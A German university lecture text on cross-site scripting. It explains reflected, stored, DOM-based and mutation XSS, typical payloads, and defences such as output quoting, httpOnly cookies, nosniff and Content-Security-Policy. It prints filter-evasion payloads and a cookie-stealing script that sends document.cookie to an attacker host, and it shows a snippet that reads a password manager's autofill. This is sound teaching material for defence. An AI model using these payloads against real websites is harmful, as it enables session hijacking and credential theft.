# JavaScript-Injections (XSS)

Javascript-Injections (Cross-Site Scripting XSS) sind ein sehr häufig
genutzter Angriffsvektor. Aufgrund der Häufigkeit dieses Angriffsvektor
sind für diesen auch mehrere Hardening-Maßnahmen verfügbar.

Prinzipiell findet bei diesem Angriffsvektor der Angreifer einen Weg um
JavaScript-Code innerhalb einer Webseite zu platzieren. Wird diese
Webseite nun von einem Opfer in dessen Browser angezeigt, wird dieser
Code exekutiert und der Angreifer kann auf diese Wiese unvorhergesehenen
Code exekutieren.

Ein einfaches Beispiel wäre innerhalb der Kommentarfunktion einer
Webseite möglich. Im Normalfall kann hier ein Benutzer Text eingeben,
z.B. “Hallo”, und dies wird für alle anderen Benutzer als Teil der
HTML-Seite ausgegeben. Das resultierende HTML-Fragment könnte z.B. so
aussehen:

```html
<div class="comment">
    <div class="author">Andreas Happe</div>
    <div class="content">Hallo</div>
</div>
```

Ein Angreifer würde nun versuchen, JavaScript-Code als Eingabe zu
übergeben, in der Hoffnung, dass dieser Code ungefiltert in der
HTML-Ausgabe übernommen wird. Betrachtet ein anderer Benutzer nun diese
Seite, würde dieser JavaScript-Code im Browser des anderen Benutzers
ausgeführt werden. Ein einfaches Beispiel hierfür wäre die Eingabe von
*&lt;script&gt;alert(1);&lt;/script&gt;*. Dieses JavaScript-Fragment ist
relativ harmlos und öffnet nur ein Browser-Popup mit dem Text “1”. Der
resultierende HTML-Code (der im Browser des Opfers angezeigt werden
würde) wäre:

```html
<div class="comment">
    <div class="author">Andreas Happe</div>
    <div class="content"><script>alert(1);</script></div>
</div>
```

Ein Problem bei der defensiven Identifikation von potentiellen
XSS-Lücken ist, dass die XSS-Angriffsfläche immens ist. Fast jede
mögliche Benutzereingabe kann XSS-Schadmuster beinhalten. Ein Beispiel
dafür wäre ein XSS-Fehler innerhalb von Flickr. Hier konnten Hacker
XSS-Schadcode in den Metadaten der hochgeladenen JPEGs integrieren (z.B.
als Kameramodel). Diese Daten wurden von Flickr ausgelesen, auf der
Homepage ausgegeben und dadurch anderen Benutzern als Schadcode
“untergejubelt”. Ein weiteres Beispiel für unerwartete
XSS-Angriffsvektoren ist dieses Dokument. Auf Anfrage hin habe ich eine
eBook-Version dieses Dokuments erstellt und auf Amazon Kindle Direct
Publishing hochgeladen. In der Entwurfsansicht wurden dann mehrere
Hundert Rechtschreibfehler bemängelt. Wenn nun allerdings in der
Detailansicht die Rechtschreibfehler betrachtet wurden, wurden
automatisch XSS-Fragmente aus dem Dokument als Teil der Weboberfläche
ausgeführt und hatten teilweise Zugriff auf Amazon-Cookies, etc.

## Arten von XSS-Angriffen

XSS-Angriffe werden in drei grobe Familien eingeteilt:

Reflected XSS: hier wird kein XSS-Code am Server persistiert sondern vom Server an
den Client zurück reflektiert. Dies wird meistens durch das Einschleusen
von JavaScript-Code über einen HTTP Parameter erfüllt — dies impliziert
allerdings auch, dass der Angreifer einen Weg findet, das Opfer zum
Aufruf der modifizierten URL zu bewegen. Beispiel einer modifizierten
URL: `http://opfer.xyz/operation?parameter=<script>alert(1)</script>`.

Stored/Persistent XSS: hier besitzt der Angreifer die Möglichkeit den Javascript-Code am
Server zu persistieren, ihn z.B. als Datenbank-Inhalt oder über eine
hochgeladene Datei zuzustellen. Das Opfer betrachtet nun eine Webseite
und bekommt durch den Server das XSS-Fragment übertragen. Ein Beispiel
wäre das Übertragen von `<script>alert(1)</script>` als Chatnachricht
innerhalb einer Webseite.

DOM-based XSS: dieser Angriffsvektor betrifft vor allem client-seitige
Javascript-Frameworks die Eingaben aus dem DOM[1] des Browsers
übernehmen. Der Angreifer versucht, Schadcode innerhalb des DOMs zu
platzieren (z.B. über die verwendete URL) und hofft, dass die
Webapplikation dieses Element zum Bau einer Webseite verwendet. Bei
dieser Form des XSS wird der bösartige Javascript Code erst im Client
gebaut.

mXSS: Webbrowser erlauben es, über eine Stringzuweisung in das
*innerHTML*-Attribute HTML-Code zu erstellen. Bevor der übergebene
String in HTML-Code verwandelt wird, wenden die unterschiedlichen
Browser-Familien Optimierungen (Mutationen) auf den String an. Dies kann
ein Angreifer ausnutzen, indem er Schadcode so formatiert, dass er
innerhalb des Strings noch harmlos wirkt, aber nach der String-Mutation
bösartig wird.

uXSS: Universal XSS zielen auf Fehler innerhalb von Webbrowsern bzw.
innerhalb von Webbrowserplugin ab. Da diese auf ein Client-Programm
abzielen, sind sie für diese Vorlesung out-of-scope.

Ein Problem an XSS-Angriffsmustern ist, dass diese sehr stark variieren
können und daher schwer zu filtern sind; anbei mehrere XSS-Muster:

```html
<script>alert(1);</script>
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

<IMG SRC= onmouseover="alert('xxs')">
<IMG SRC="jav    ascript:alert('XSS');">
<BGSOUND SRC="javascript:alert('XSS');">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

Eine gute Quelle für weitere XSS-Beispiele ist das [OWASP XSS Filter
Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).

## XSS-Payloads

Mittels des eingeschleusten JavaScript-Code versucht der Angreifer nun,
negativen Einfluss auf einen Benutzer zu nehmen.

### Session Hijacking

Javascript wird innerhalb des Browsers ausgeführt. Da in diesem auch
zumeist das Session-Cookie zur Identifikation eines Benutzers gegneüber
dem Server gespeichert wird, ist das Stehlen dieses via XSS naheliegend.

Um dies zu bewerkstelligen, verwendet der Angreifer einen
öffentlich-erreichbaren Webserver zu welchem die Cookies (und damit die
Benutzeridentitäten) übermittelt werden sollen. In dem Bespiel wird
<https://offensive.one/cookie_catcher> für diesen Zweck verwendet.

Findet der Angreifer auf der Opferwebseite eine persistent-XSS
Möglichkeit, könnte er nun folgendes Javascript-Fragement als
XSS-Payload verwenden:

```html
<script>
    document.location="https://offensive.one/cookie_catcher?c="+document.cookie;
</script>
```

Der Webbrowser würde also zu einer neuen URL auf dem Angreifer-Server
navigiert werden. Ein Teil der URl ist der Parameter ,,c”, dieser
Parameter wird mit den aktuellen Cookies befüllt. In diesen ist auch das
Session-Cookie enthalten. Der Angreifer würde dieses nun aus den
Log-Dateien seines Servers auslesen, und Zugriffe auf den ursprünglichen
Server mit diesem Cookie mit der Identität des Opfers ausführen können.

Als Gegenmassnahme für diese Payload sollte insbesondere das
*httpOnly*-Flag bei Cookies genannt werden. Durch dieses Flag wird der
Zugriff via Javascript auf das damit konfigurierte Cookie unterbunden.

### Virtual Defacement

Ein weiteres Beispiel wäre *Virtual Defacement*: bei diesem wird mittels
JavaScript die dargestellt Webseite verändert und dadurch ein Defacement
durchgeführt. Bösartig an diesem ist, dass die direkten Inhalte
(Webseiten im Filesystem des Webservers) weiterhin korrekt aussehen.

Ein Beispiel wäre folgende Opferwebseite:

```html
<html>
    <head>..
        <script src="http://cdn.local/script.js"></script>
    </head>
    <body id="main">
        <h1>My Company</h1>
    </body>
</html>
```

In diesem konkrete Beispiel wird Javascript von einem *Content Delivery
Network* geladen, liegt also nicht lokal am Opfer-Webserver vor. Ein
Angreifer würde nun den CDN-Server hacken und das `script.js`-File ersetzen:

```javascript
document.getElementById("main").innerHTML = "My Company sucks";
```

In diesem Fall wird der Inhalt des Elements ,,main” ersetzt und
schlußendlich so die Opfer-Webseite defaced.

### Social Engineering

XSS kann auch als Teil von Social-Engineering Angriffen verwendet
werden. Ein Besipiel hierfür wäre das [BeEF-Framework](https://beefproject.com/). Bei diesem wird über Javascript ein
Client-Handler im Browser installiert. Hierfür könnte z. B. eine
XSS-Lücke missbraucht werden. Über diesen Handler können mehrere
Attacken gestartet werden, unter anderem:

- Anzeigen eines Fake *Software muss aktualisiert werden*-Fenster über
  dies der Benutzer zum Update eines Browser-Plugins ermuntert wird.
  Hierbei wird allerdings kein Browserplugin upgedatet, sondern eine
  vom Angreifer bereitgestelle ausführbare Datei exekutiert.

- Anzeigen eines Assistenten, z. B. ,,Clippy”. Auf diese Weise kann
  ein vorgesehener interaktiver Chat emuliert, und dem Kunden
  Informationen entlockt werden.

- BeEF bietet auch Angriffe, welche nicht direkt im Social-Engineering
  verankert sind. Beispiele hierfür wären z.B. Browser-Exploits,
  Information Gathering, Network Tunneling über Javascript.

### Zusätzliche Angreifersoftware

In den letzten Jahren wurden XSS-Injections auch für
Bitcoin/Crypto-Mining missbraucht. In diesem Fall wird beim Besuch der
Webseite ein Crypto-Miner im Browser des Benutzers verankert und zum
Mining verwendet. Dieses Konzept wird mittlerweile auch als
Entschädigungsmodel für Webseitenautoren verwendet.

XSS kann auch verwendet werden, um den Browser des Opfers Teil eines
DDoS-Botnets zu machen. Ein berühmtes Beispiel hierfür ist die LOIC
([Low-Orbit Ion Canon](https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon)) die z.B. auch gerne von Anonymous verwendet
wurde.

### Stehlen von Daten aus einem Passwortmanager

Die meisten modernen Webbrowser bieten eine Form eines Passwortmanagers
an. Nach einem durchgeführtem Login werden bei einem erneuten Besuch der
Seite die Login-Credentials automatisch vom Webbrowser in das Formular
eingetragen.

Falls ein Angreifer eine XSS-Lücke innerhalb eines Login-Formulars
findet, kann er diese ausnutzen um die Login-Daten zu stehlen:

```html
<script>
document.write('<form><input id=password type=password style=visibility:hidden></form>');
setTimeout('alert("Password: " + document.getElementById("password").value)', 100);
</script>
```

## DOM-based XSS-Angriffe

Bei DOM-based XSS wird das DOM innerhalb des Browsers modifiziert. Da
der Angriff innerhalb des Browsers geschieht, besitzt der Webserver
keine Möglichkeit diese Angriffe zu erkennen oder sogar zu verhindern.

Ein primitives Beispiel für eine über DOM-based XSS verwundbare Webseite
(`seite.html`):

```html
<html>
    <head>..</head>
    <body>
        <script>
            document.write("<b>URL: " + document.baseURI + "</b>");
        </script>
    </body>
</html>
```

Bei dieser Seite wird die aktuelle URL via Javascript ausgelesen (über
*document.baseURI*) und dynamisch in die Webseite eingefügt. Wird diese
Seite z.B. als `seite.html`
aufgerufen würde *URL: seite.html* ausgegeben werden. Dies geschieht im
Browser des Opfers, keine Serveroperation wird dabei involviert.

Ein Angreifer könnte diese Seite ausnutzen und z.B. über
`seite.html&<script>alert(1)</script>`
aufrufen. Auf diese Weise wird wieder die URL in das Dokument eingebaut,
dabei wird allerdings auch der neue Script-Tag (welcher in der URL
mitübergeben wurde) eingebaut, un dder Browser exekutiert den Inhalt
dieser Script-Tags als Javascript-Code. In diesem Fall wird ein Popup
ausgegeben, ein Angreifer könnte natürlich weitere Payloads verwenden.

Warum ist diese Angriffsart gefährlich? Ein Angreifer kann ja immerhin
nichts am Server modifizieren? Die Antwort liegt im *Origin* der
HTML-Seite. Falls ein Fehler innerhalb einer Webapplikation vorgefunden
wird, kann das eingeführte Javascript auf alle Resourcen innerhalb des
identen Origins zugreifen und so z. B. die verwendeten Session-Cookies
mit der Benutzeridentität auslesen. Häufig werden DOM-based XSS-Fehler
in inkludierten Dokumentationen vorgefunden. Entwickler downloaden z.B.
Archive mit Javascript-Bibliotheken, entpacken diese, und inkludieren
diese in einem *asset* oder *contrib* Verzeichnis. Die entpackten
Archive (inkl. dabei vorhandener Dokumentation) werden auf diese Weise
vollständig auf dem Webserver deployed und sind öffentlich zugreifbar.
Wenn in diesen ein DOM-based XXS Fehler vorhanden ist, kann dieser von
Angreifers missbraucht werden. Da beigemengte Dokumentation selten als
möglicher Angriffsvektor erkannt wird (sie führt ja auch keine direkten
serverseitigen Operationen aus), bleiben diese potentiellen
Schwachstellen häufig lange unerkannt.

## Upload von HTML/Javascript-Dateien

Falls der Angreifer die Möglichkeit besitzt Dateien hochzuladen, kann
dieser versuchen, auf diese Weise Javascript-Code in der Applikation zu
hinterlegen. Hier ist der Angriffsvektor, diese Dateien von einem
anderen Benutzer öffnen zu lassen. Da die hochgeladenen Dateien
innerhalb der Applikation geöffnet werden, erhalten diese Zugriff auf
sensible Benutzerdaten wie z.B. Session-Daten.

Auch hier sollten die erlaubten Dateitypen durch eine whitelist
eingeschränkt werden. Zusätzlich sollte der *Content-Disposition*-Header
verwendet werden. Durch diesen teilt der Webserver dem Browser mit, dass
eine Datei zum Download bestimmt ist. In diesem Fall lädt der Webbrowser
die Datei herunter und öffnet anschließend potentiell die lokal
heruntergeladene Datei — dadurch ist diese nicht mehr Teil der
Webapplikation und kann daher nicht mehr auf z.B. Session-Cookies
zugreifen.

### X-Content-Type-Options

Webserver übermitteln den MIME-Datentypen von übertragenen Dateien über
den *Content-Type* Header. Da diese Header “früher” ab und zu falsch
gesetzt wurden, verwenden einige Browser (primär verschiedene Microsoft
Internet Explorer und Edge Versionen) eine Heuristik um dynamisch den
Content-Type zu bestimmen. Dabei wird der Anfang einer Datei gelesen,
engl. “sniffing”, und basierend auf der gefundenen Struktur ein MIME-Typ
zugeordnet.

Dies kann ein Angreifer missbrauchen indem er z.B. ein Textfile hoch
lädt (Datentyp *text/plain*). Diese Datei enthält HTML-Code inklusive
bösartigem JavaScript. Wenn nun ein Opfer auf dieses File zugreift und
dessen Browser eine Heuristik verwendet, würde der Dateityp als
JavaScript erkannt, und vom Browser das inkludierte bösartige JavaScript
ausgeführt werden. Auf diese Weise kann der Angreifer eine potentielle
Javascript-Upload-Sperre umgehen.

Mittels des *X-Content-Type-Options: nosniff*-Headers kann der Webserver
dem Webbrowser mitteilen, dass kein sniffing durchgeführt, und dem vom
Server übermittelten Content-Type vertraut werden kann.

Zusätzlich blockieren Browser requests auf JavaScript- bzw. CSS-Dateien
falls hier nicht der richtige Content-Type gesetzt ist (*text/css* bzw.
*javascript*).

## Gegenmaßnahmen

Gegenüber XSS-Angriffen werden prinzipiell zwei Gegenmaßnahmen
empfohlen: Input Sanitation und Escaping von Ausgaben.

### Filtern der Eingaben

Werden Daten aus nicht-vertrauenswürdigen Quellen verwendet, müssen
diese automatisiert auf Schadmuster hin überprüft werden. Achtung:
jegliche Form von Daten, die durch einen Benutzer bereitgestellt werden,
sind automatisch nicht-vertrauenswürdige Daten. Ebenso muss beachtet
werden, dass dies auch für Daten aus Benutzerhand gilt, die indirekt
über eine Datenbank ausgelesen werden.

Da es eine Vielzahl möglicher Schadcodevarianten als auch viele
potentielle Tarnmethoden gibt, ist das Filtern von Schadcode effektiv
nur durch Verwendung einer (extern) gewarteten Bibliothek möglich.

Eine weiter Möglichkeit ist die Verwendung einer Web-Application
Firewall wie z.B. *mod\_security* im Zusammenspiel mit dem OWASP Core
Rule Set (2). Hierbei wird jeder eingehende HTTP Request auf Schadcode
hin überprüft und ggf. der Schadcode gefiltert bzw. der gesamte Request
verworfen. Ein Problem bei der Verwendung von WAFs ist deren
Ressourcen-Verbrauch als auch die potentiell hohe Anzahl von
False-Positives (Anfragen die zwar nicht bösartig sind, aber von der WAF
als bösartig erkannt, und daher geblockt werden).

### Quoting während der Ausgabe

Um einen XSS-Angriff erfolgreich durchzuführen, muss der
Javascript-Schadcode im Webbrowser des Opfers ausgeführt werden. Um dies
bewerkstelligen zu können, muss eine bösartige Benutzereingabe Teil der
dargestellten Webseite werden. Eine weitere Gegenmaßnahme gegenüber ist
es daher, Benutzereingaben vor der Ausgabe so zu maskieren/quoten, dass
diese nicht als Schadcode ausgeführt werden können. Dies wird häufig
automatisiert durch Frameworks bzw. Bibliotheken durchgeführt.

Ein Problem dabei ist, dass die bösartige Benutzereingabe in
Abhängigkeit der Verwendung unterschiedliche gequotet werden muss. Wird
eine Eingabe als Teil einer URL verwendet, muss diese URL gequotete
werden; wird eine Eingabe Teil von HTML muss diese HTML-gequoted werden.
Wird eine Eingabe serverseitig als Teil von HTML ausgegeben und ist
wiederum selbst Teil eines JavaScripts, dann muss die Eingabe sowohl
Javascript- als auch HTML-gequotet werden. Eine gute Übersicht über
diese Problematik gibt das [OWASP XSS Prevention Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md). Ein
einfaches Beispiel hierfür wäre folgendes serverseitige Source Code
Fragment:

```html
<script>
var x = '<%= taintedVar %>';
var d = document.createElement('div');
d.innerHTML = x;
document.body.appendChild(d);
</script>
```

Die Variable *taintedVar* wird hier in einen Javascript-String eingefügt
(Zeile 2), hierbei muss sie gequoted werden, damit Schadcode nicht den
String schließen und bösartigen Javascript-Code exekutieren würde.
Zusätzlich wird die Eingabe zum Wert der Variable *x* und dieser Wert
wird in die HTML Seite eingebaut. Dadurch wird diese Variable als
HTML-Code interpretiert und auch auf diese Weise könnte bösartiger Code
eingebaut werden.

Einige Grundregeln zur Verwendung von user-supplied Daten innerhalb von
Javascript:

- Die Verwendung von Benutzerdaten sollte so weit wie möglich
  minimiert werden.

- User-Supplied Daten sollten niemals auf der linken Seite (LHS) einer
  Zuweisung verwendet werden.

- die Methoden *element.write* und *element.writeln* als auch die
  Attribute *innerHTML* und *outerHTML* rendern die übergebenen Texte
  als HTML-Code. Dabei kann auch Code exekutiert werden — es wird
  empfohlen stattdessen *innerText* und *textContent* zu verwenden.

- die Methode *eval* sollte vermieden werden. Achtung: teilweise wird
  eval intern verwendet (z.B. bei Verwendung von Timeout-Funktionen),
  hier sollten keine Benutzereingaben verwendet werden.

- Ebenso sollte niemals user-supplied Data als Event-Handler verwendet
  werden.

## Hardening mittels X-XSS-Protection

Moderne Browser verwendeten Heuristiken um *Reflected-XSS* Angriffe
automatisiert zu erkennen. Zumeist werden hierfür die ausgehenden HTTP
Requests (inkl. Parameter) mit den eingehenden Antwortdokumenten
verglichen.

Leider kann nicht davon ausgegangen werden, dass bei Browsern diese
Heuristik per Default aktiviert oder deaktiviert ist — das Verhalten
kann allerdings mittels des *X-XSS-Protection*-Header gesteuert werden.
Es wird daher empfohlen, diesen Header zu setzen um undefiniertes
Verhalten zu vermeiden.

Folgende Werte sind für den Header erlaubt:

- **0**: die XSS-Heuristik soll deaktiviert werden.

- **1**: die XSS-Heuristik soll aktiviert werden, erkannte potentielle
  XSS-Schadmuster werden aus der Ausgabe entfernt.

- **1;mode=block**: die XSS-Heuristik soll aktiviert werden, falls
  XSS-Schadmuster erkannt werden wird keine Webseite gerendert.

Während das automatische Filtern von XSS-Schadcode theoretisch positiv
aus Sicherheitssicht sein sollte, war dies in der Praxis fehlerbehaftet
und führte zu folgenden Problemen:

- False-Positives: nicht bösartiger Schadcode wurde als Schadcode
  erkannt und gefiltert. Dadurch wurde die Funktionsfähigkeit korrekt
  programmierter Webseiten eingeschränkt.

- Wird X-XSS-Protection im Default-Modus verwendet, versucht der
  Browser nur den Schadcode aus dem Antwortdokument zu filtern. Dies
  kann gezielt durch Angreifer ausgenutzt werden, um auf diese Weise
  XSS-Code zu generieren[6].

Aus diesem Grund ignorieren moderne Browser diesen Sicherheitsheader
mittlerweile (Google Chrome, Mozilla Firefox und Microsoft Edge, Stand
31.12.2019). Als Gegenmaßnahme gegenüber XSS kann daher nur der Einsatz
von CSP empfohlen werden (abgesehen davon, XSS-Lücken generell nicht zu
implementieren).

## Content-Security-Policy

Die Content Security Policy kann verwendet werden um potentielle
Javascript-Lücken zu vermeiden. Hierbei wird durch eine Policy definiert
in welchen Dateien überhaupt Javascript-Code vorkommen darf. Falls eine
saubere Trennung in JavaScript- und HTML-Dateien durchgeführt wurde,
kann die Definition von JavaScript-Fragmenten in HTML Dateien vollkommen
deaktiviert werden. Falls es ein Angreifer nun schafft, durch eine
Injection Lücke JavaScript-Code in einer HTML-Seite zu platzieren, würde
dieser durch den Browser einfach ignoriert werden.

Ein Problem beim Einsatz von CSP sind *polyglot* Files. Dies sind
Dateien, die so gebaut wurden, dass sie gleichzeitig zwei
unterschiedliche Datentypen erfüllen. Ein Beispiel für ein polyglot File
ist eine JPEG-Datei welche, wenn sie als Textdatei eingebunden wird,
validen Javascript-Code beinhaltet. Ein Beispiel für solche Dateien kann
unter <https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs>
gefunden werden. Dies ist problematisch, da ein Angreifer ein JavaScript
File als Bild hochladen kann (während der Upload von JavaScript-Files
normalerweise durch eine Webapplikation blockiert wird) und danach
mittels eines *script*-Tags dieses Bild als Javascript-Source File
innerhalb von HTML inkludieren kann. Dies umgeht potentielle
CSP-Richtlinien.
